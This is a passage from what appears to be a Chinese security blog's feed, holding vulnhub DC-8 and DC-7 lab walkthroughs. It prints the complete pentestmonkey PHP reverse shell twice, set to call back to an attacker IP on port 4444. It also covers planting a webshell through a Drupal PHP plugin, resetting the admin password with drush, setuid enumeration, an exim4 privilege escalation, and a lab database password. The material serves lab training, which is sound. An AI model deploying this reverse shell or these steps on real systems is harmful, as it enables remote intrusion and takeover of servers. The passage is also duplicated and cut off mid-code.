&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br><span class="line">  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171809111.png"></p><p>kali需要提前监听,等待反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171816255.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>家目录没有东西,sudo -l需要密码,但是发现一个exim4命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171819787.png"></p><p>查看exim4 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep exim</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171856431.png"></p><p>用msf搜索利用,发现需要一个会话<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171825215.png"></p><p>利用拿到的shell,反弹一个会话给msf<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171839142.png"></p><p>利用失败,再找别的exp打,找提权的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171842636.png"></p><p>将几个exp拷贝出来,kali用python起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171845121.png"></p><p>靶机下载,注意要到tmp目录下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171857239.png"></p><p>使用exp,在&#x2F;root下找到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171900511.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub &lt;a href=&quot;https://www.vulnhub.com/entry/dc-8,367/&quot;&gt;https://www.vulnhub.com/entry/dc-8,367/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.149&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="Drupal" scheme="https://syst1m.top/tags/Drupal/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc7打靶</title>
    <link href="https://syst1m.top/2022/06/15/vulnhub-dc7%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/15/vulnhub-dc7%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-15T11:44:43.000Z</published>
    <updated>2022-06-16T11:42:10.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a><br>靶机:172.16.17.148<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151948527.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151951342.png"></p><p>访问首页<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206151950632.png"></p><p>cms为Drupal8,搜一下cms漏洞,尝试几个exp但不存在<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152016201.png"></p><p>扫描一下目录,都是403,没有可以利用的地方<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152017923.png"></p><p>目光来到首页,发现一个id<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152019276.png"></p><p>google在github上找到源码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152020088.png"></p><p>在配置文件翻到数据库账号密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152023471.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>拿到数据库账号密码,但是nmap扫描的时候,mysql并没有开启外链</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$user</span>name = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="symbol">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h2><p>拿着账号密码撞一下登录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152029676.png"></p><p>再试一下ssh,成功登录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152031261.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>翻看家目录下的mbox文件找到敏感文件 backups.sh<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152042388.png"></p><p>发现没有权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152044362.png"></p><p>看一下root权限的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152047725.png"></p><p>几乎都没有权限,也没有可以利用的地方,但是这个框架有一个Drush命令<br>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块&#x2F;主题&#x2F;配置文件等代码进行交互。</p><p>修改admin密码,上网站后台看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=<span class="string">&quot;123&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152059358.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>没有上传环境,但是我们可以安装插件,没有环境我们自己创造环境<br>安装本地插件,下载地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.drupal.org<span class="regexp">/project/</span>php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152122907.png"></p><p>启用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152119436.png"></p><p>写webshell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152123387.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206152131986.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;172.16.17.140&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">4444</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change to a safe directory</span></span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove any umask we inherited</span></span><br><span class="line">  <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do the reverse shell...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open reverse connection</span></span><br><span class="line">  <span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Spawn shell process</span></span><br><span class="line">  <span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set everything to non-blocking</span></span><br><span class="line">  <span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Check for end of TCP connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check for end of STDOUT</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">    <span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">    <span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span 